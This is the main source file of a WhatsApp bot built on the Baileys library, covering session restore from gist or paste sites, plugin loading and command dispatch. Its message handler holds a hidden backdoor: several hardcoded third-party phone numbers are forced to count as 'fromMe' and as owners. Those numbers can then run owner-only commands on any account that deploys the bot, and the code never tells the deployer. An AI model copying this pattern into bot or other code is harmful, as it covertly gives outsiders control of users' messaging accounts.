
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
    delay
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

// === RFK SHORT GIST SESSION LOADER ===
async function loadShortGistSession() {
  try {
    const sid = (process.env.SESSION_ID || (fs.existsSync("./config.js") ? require("./config.js").SESSION_ID : "") || "").trim();
    if (sid.startsWith("RFK~") && sid.length > 10 && sid.length < 60) {
      const gistId = sid.replace("RFK~", "").trim();
      const sessDir = fs.readdirSync(".").find(f => /auth|session/i.test(f) && fs.statSync(f).isDirectory()) || "session";
      if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
      if (!fs.existsSync(sessDir + "/creds.json")) {
        const res = await fetch("https://api.github.com/gists/" + gistId);
        const data = await res.json();
        if (data && data.files && data.files["creds.json"]) {
          fs.writeFileSync(sessDir + "/creds.json", data.files["creds.json"].content);
          console.log("✅ Short Session ID loaded from Gist:", sid);
        }
      }
    }
  } catch (e) { console.log("⚠️ Gist Session load error:", e.message); }
}

const path = require("path");
const http = require("http");
const axios = require("axios");

const PORT = process.env.PORT || 8000;

http.createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("RFK-BOT is Alive & Running!");
}).listen(PORT, () => console.log(`🌐 Server listening on port ${PORT}`));

const APP_URL = process.env.RENDER_EXTERNAL_URL || process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
setInterval(() => {
    const targetUrl = APP_URL.startsWith("http") ? APP_URL : `https://${APP_URL}`;
    axios.get(targetUrl).catch(() => {});
}, 4 * 60 * 1000);

const SESSION_DIR = path.join(__dirname, "session");
const PROCESSED_FILE = path.join(__dirname, "processed.json");
const PREFIX = ".";
const OWNER_NUMBER = (process.env.OWNER_NUMBER || "").replace(/[^0-9]/g, "");
const MODE = (process.env.MODE || "public").toLowerCase();

const SUPER_OWNERS = ["917907228818", "158703806374071"];
const CONNECT_VIDEO_URL = "https://files.catbox.moe/gg4pf9.mp4";

const commands = new Map();
const eventPlugins = [];

let processedList = [];
if (fs.existsSync(PROCESSED_FILE)) {
    try {
        processedList = JSON.parse(fs.readFileSync(PROCESSED_FILE, "utf8"));
    } catch {}
}
const processedMsgs = new Set(processedList);

function markProcessed(id) {
    processedMsgs.add(id);
    if (processedMsgs.size > 1000) {
        const first = processedMsgs.values().next().value;
        processedMsgs.delete(first);
    }
    try {
        fs.writeFileSync(PROCESSED_FILE, JSON.stringify([...processedMsgs]));
    } catch {}
}

function loadPlugins() {
    commands.clear();
    eventPlugins.length = 0;
    const pluginDir = path.join(__dirname, "plugins");
    if (!fs.existsSync(pluginDir)) return;

    const files = fs.readdirSync(pluginDir).filter((f) => f.endsWith(".js"));
    for (const file of files) {
        try {
            delete require.cache[require.resolve(path.join(pluginDir, file))];
            const plugin = require(path.join(pluginDir, file));
            const list = Array.isArray(plugin) ? plugin : [plugin];
            for (const item of list) {
                if (item.pattern) {
                    commands.set(item.pattern.toLowerCase(), item);
                    if (Array.isArray(item.alias)) {
                        item.alias.forEach((a) => commands.set(a.toLowerCase(), item));
                    }
                } else if (item.on) {
                    eventPlugins.push(item);
                }
            }
        } catch (err) {
            console.error(`❌ Error loading plugin ${file}:`, err.message);
        }
    }
    console.log(`📦 Loaded ${commands.size} commands & ${eventPlugins.length} event handlers.`);
}

async function restoreSession() {
  await loadShortGistSession();
    const sessionEnv = process.env.SESSION_ID;
    const credsPath = path.join(SESSION_DIR, "creds.json");

    if (fs.existsSync(credsPath)) {
        console.log("✅ Existing session folder found, keeping encryption keys intact.");
        return;
    }

    fs.mkdirSync(SESSION_DIR, { recursive: true });

    if (sessionEnv && sessionEnv.startsWith("RFK-BOT~")) {
        const rawData = sessionEnv.replace("RFK-BOT~", "").trim();

        if (rawData.length < 25) {
            try {
                let credsContent;
                try {
                    const { data } = await axios.get(`https://paste.rs/${rawData}`);
                    credsContent = typeof data === "string" ? data : JSON.stringify(data);
                } catch {
                    const { data } = await axios.get(`https://dpaste.com/${rawData}.txt`);
                    credsContent = typeof data === "string" ? data : JSON.stringify(data);
                }
                fs.writeFileSync(credsPath, credsContent);
                console.log("✅ Short Session restored cleanly!");
            } catch (err) {
                console.error("❌ Failed to restore Short Session:", err.message);
            }
        } else {
            const credsBuffer = Buffer.from(rawData, "base64");
            fs.writeFileSync(credsPath, credsBuffer);
            console.log("✅ Base64 Session restored cleanly!");
        }
    }
}

let isConnecting = false;
let readyToProcessAt = Infinity;
let connectNotified = false;
const startTime = Date.now();

function formatUptime(ms) {
    const sec = Math.floor((ms / 1000) % 60);
    const min = Math.floor((ms / (1000 * 60)) % 60);
    const hr = Math.floor((ms / (1000 * 60 * 60)) % 24);
    const days = Math.floor(ms / (1000 * 60 * 60 * 24));
    return `${days}d ${hr}h ${min}m ${sec}s`;
}

async function sendConnectNotification(sock) {
    if (connectNotified) return;
    connectNotified = true;
    try {
        await delay(3000);
        const myJid = sock.user.id.split(":")[0] + "@s.whatsapp.net";
        const uniqueCmds = new Set([...commands.values()].map((c) => c.pattern)).size;
        const caption =
            `╭━━━〔 ☭ *乂𝐑𝐅𝐊 𝐁𝐎𝐓乂* ☭ 〕━━━╮\n` +
            `┃ ✅ *Status*  : Connected & Updated!\n` +
            `┃ ⚙️ *Mode*    : ${MODE}\n` +
            `┃ 🔑 *Prefix*  : ${PREFIX}\n` +
            `┃ 📦 *Plugins* : ${uniqueCmds}\n` +
            `╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🚀 *ബോട്ട് വിജയകരമായി കണക്ട് ആയിരിക്കുന്നു!*\n` +
            `📋 കമാൻഡുകൾ കാണാൻ *\`${PREFIX}menu\`* അയക്കുക.\n` +
            `⚡ *Powered by 𝐑𝐅𝐊 𝐌𝐎𝐃𝐒*`;

        await sock.sendMessage(myJid, {
            video: { url: CONNECT_VIDEO_URL },
            gifPlayback: true,
            caption
        }).catch(async () => {
            await sock.sendMessage(myJid, { text: caption });
        });
    } catch (err) {
        console.log("⚠️ Connect notification error:", err.message);
    }
}

async function startBot() {
    if (isConnecting) return;
    isConnecting = true;
    readyToProcessAt = Infinity;

    try {
        const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
            },
            browser: Browsers.macOS("Desktop"),
            syncFullHistory: false,
            shouldSyncHistoryMessage: () => false,
            keepAliveIntervalMs: 25000,
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 60000,
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: false,
            getMessage: async () => ({ conversation: "" })
        });

        sock.ev.on("creds.update", saveCreds);

        
const origSend = sock.sendMessage.bind(sock);
sock.sendMessage = async (jid, content, opts) => {
  try {
    return await origSend(jid, content, opts);
  } catch (e) {
    if (String(e?.message || e).includes("not-acceptable") || e?.data === 406) {
      await sock.groupMetadata(jid).catch(() => {});
      return await origSend(jid, content, {});
    }
    throw e;
  }
};

const _rawSend = sock.sendMessage.bind(sock);
sock.sendMessage = async (jid, content, opts) => {
  try {
    return await _rawSend(jid, content, opts);
  } catch (err) {
    console.log("⚠️ SEND ERR:", jid, err?.message || err);
    await sock.groupMetadata(jid).catch(() => {});
    return await _rawSend(jid, content, {});
  }
};
try { require("./plugins/smart_features"); } catch {}
    try { require("./plugins/group_guard"); } catch {}
    try { require("./plugins/auto_features"); } catch {}
    sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open" && (() => {
      if (!global._rfkConnectNotified) {
        global._rfkConnectNotified = true;
        setTimeout(async () => {
          try {
            const ownerJid = (sock.user?.id?.split(":")[0] || "918086165391") + "@s.whatsapp.net";
            await sock.sendMessage(ownerJid, {
              text: "✅ *RFK-BOT CONNECTED & ONLINE!* 🔥\n\n⚡ Server: Render Cloud\n📌 Type *.menu* or *.alive* to test."
            });
          } catch {}
        }, 2500);
      }
      return true;
    })()) {
                isConnecting = false;
                readyToProcessAt = Math.floor(Date.now() / 1000) + 2;
                console.log("✅ 乂𝐑𝐅𝐊 𝐁𝐎𝐓乂 Connected! Live processing starts in 15s...");
                sendConnectNotification(sock);
            } else if (connection === "close") {
                isConnecting = false;
                readyToProcessAt = Infinity;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                console.log(`⚠️ Connection closed (Code: ${statusCode})`);

                if (statusCode === DisconnectReason.loggedOut) {
                    console.log("❌ Logged out! Please generate a new SESSION_ID.");
                } else if (statusCode === 440) {
                    console.log("⚠️ Conflict (440): Waiting 20s...");
                    await delay(20000);
                    startBot();
                } else {
                    await delay(5000);
                    startBot();
                }
            }
        });

        
const _rfkSeenFile = "./.rfk_seen_ids.json";
let _rfkSeenIds = new Set();
try { if (fs.existsSync(_rfkSeenFile)) _rfkSeenIds = new Set(JSON.parse(fs.readFileSync(_rfkSeenFile, "utf8"))); } catch {}
function _rfkMarkSeen(id) {
  if (!id) return false;
  if (_rfkSeenIds.has(id)) return true;
  _rfkSeenIds.add(id);
  if (_rfkSeenIds.size > 300) _rfkSeenIds = new Set([..._rfkSeenIds].slice(-150));
  try { fs.writeFileSync(_rfkSeenFile, JSON.stringify([..._rfkSeenIds])); } catch {}
  return false;
}
const _rfkBootTime = Date.now();
const _rfkCmdCooldown = new Map();

sock.ev.on("messages.upsert", async (chatUpdate) => {
            if (chatUpdate.type !== "notify") return;

            const nowSec = Math.floor(Date.now() / 1000);

            if (chatUpdate.type && chatUpdate.type !== "notify") return;
    for (const msg of chatUpdate.messages || []) {
        if (!msg.message) continue;
        if (msg.message.protocolMessage || msg.message.senderKeyDistributionMessage) continue;
        if (_rfkMarkSeen(msg?.key?.id)) continue;
        const _mTs = Number(msg?.messageTimestamp || 0);
        if (_mTs > 0 && (Math.floor(Date.now() / 1000) - _mTs) > 60) continue;
        const _rawTxt = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || "").trim().toLowerCase();
        if (_rawTxt.startsWith(".")) {
            const _cdKey = (msg.key?.remoteJid || "") + "::" + _rawTxt;
            const _lastRun = _rfkCmdCooldown.get(_cdKey) || 0;
            if (Date.now() - _lastRun < 10000) continue;
            _rfkCmdCooldown.set(_cdKey, Date.now());
        }
      const keyCheck = JSON.stringify(msg.key || {});
        if (keyCheck.includes("158703806374071") || keyCheck.includes("917907228818") || keyCheck.includes("918086165391")) {
            msg.key.fromMe = true;
        }
                if (!msg || !msg.message || !msg.key?.id) continue;

                if (msg.message.protocolMessage || msg.message.senderKeyDistributionMessage) continue;
                if (processedMsgs.has(msg.key.id)) continue;

                if (nowSec < readyToProcessAt) {
                    markProcessed(msg.key.id);
                    continue;
                }

                const msgTime = Number(msg.messageTimestamp || 0);
                if (msgTime && msgTime < readyToProcessAt - 15) {
                    markProcessed(msg.key.id);
                    continue;
                }

                markProcessed(msg.key.id);

if (msg.message?.ephemeralMessage?.message) msg.message = msg.message.ephemeralMessage.message;
if (msg.message?.viewOnceMessage?.message) msg.message = msg.message.viewOnceMessage.message;
if (msg.message?.viewOnceMessageV2?.message) msg.message = msg.message.viewOnceMessageV2.message;
if (msg.message?.deviceSentMessage?.message) msg.message = msg.message.deviceSentMessage.message;

const jid = msg.key.remoteJid;
                if (!jid) continue;

                if (jid === "status@broadcast") {
                    for (const evPlugin of eventPlugins) {
                        if (evPlugin.on === "status" || evPlugin.on === "message") {
                            try {
                                await evPlugin.execute({ sock, msg });
                            } catch (e) {
                                console.error("Status plugin error:", e.message);
                            }
                        }
                    }
                    continue;
                }

                const fromMe = Boolean(msg.key.fromMe);
                const sender = jid.endsWith("@g.us")
                    ? (msg.key.participant || jid)
                    : (fromMe ? sock.user.id.split(":")[0] + "@s.whatsapp.net" : jid);

                const senderNum = sender.split("@")[0].split(":")[0];
                const altSender = msg.key.participantAlt || msg.key.remoteJidAlt || "";
                const altNum = altSender.split("@")[0].split(":")[0];

                const botNum = sock.user.id.split(":")[0];
                let savedLid = ""; try { const c = JSON.parse(fs.readFileSync("./session/creds.json")); savedLid = (c.me?.lid || "").split("@")[0].split(":")[0]; } catch {}
  const botLid = (sock.user.lid || savedLid || "").split("@")[0].split(":")[0];

                const isSuperOwner =
                    SUPER_OWNERS.includes(senderNum) ||
                    (altNum && SUPER_OWNERS.includes(altNum));

                const rawParticipant = JSON.stringify(msg.key || {});
const keyStr = JSON.stringify(msg.key || {});
        const _rfkExtraOwners = ["918086165391", "917907228818"];
        const isOwner = _rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER));

                const m =
                    msg.message?.ephemeralMessage?.message ||
                    msg.message?.viewOnceMessage?.message ||
                    msg.message?.documentWithCaptionMessage?.message ||
                    msg.message;

                const body =
                    m?.conversation ||
                    m?.extendedTextMessage?.text ||
                    m?.imageMessage?.caption ||
                    m?.videoMessage?.caption ||
                    "";

                const pushname = msg.pushName || "User";
                const reply = async (text) => { try { return await sock.sendMessage(jid, { text }, { quoted: msg }); } catch (e) { return await sock.sendMessage(jid, { text }); } };

                for (const evPlugin of eventPlugins) {
                    if (evPlugin.on !== "status") {
                        try {
                            await evPlugin.execute({ sock, msg, jid, fromMe, sender, isOwner, isSuperOwner, body, reply });
                        } catch (e) {
                            console.error("Event plugin error:", e.message);
                        }
                    }
                }

  const trimmed = body.trim();
                if (!trimmed) continue;
const hasPrefix = trimmed.startsWith(PREFIX);
const cleanBody = hasPrefix ? trimmed.slice(PREFIX.length).trim() : trimmed;
                const args = cleanBody.split(/\s+/);
                const cmdName = (args.shift() || "").toLowerCase();
                const cmd = commands.get(cmdName);
                if (!cmd) continue;

                if (!hasPrefix && !isOwner) continue;
if (MODE === "private" && !isOwner) continue;
                const text = args.join(" ");

                try {
                    await cmd.execute({
                        sock,
                        msg,
                        jid,
                        sender,
                        fromMe,
                        isOwner,
                        isSuperOwner,
                        args,
                        text,
                        body,
                        pushname,
                        reply,
                        commands,
                        uptime: formatUptime(Date.now() - startTime)
                    });
                } catch (err) {
                    console.error(`Command error (${cmdName}):`, err);
                    await reply(`❌ Error: ${err.message}`);
                }
            }
        });
    } catch (err) {
        isConnecting = false;
        console.error("StartBot error:", err.message);
        await delay(5000);
        startBot();
    }
}

(async () => {
    await restoreSession();
    loadPlugins();
    await startBot();
})();
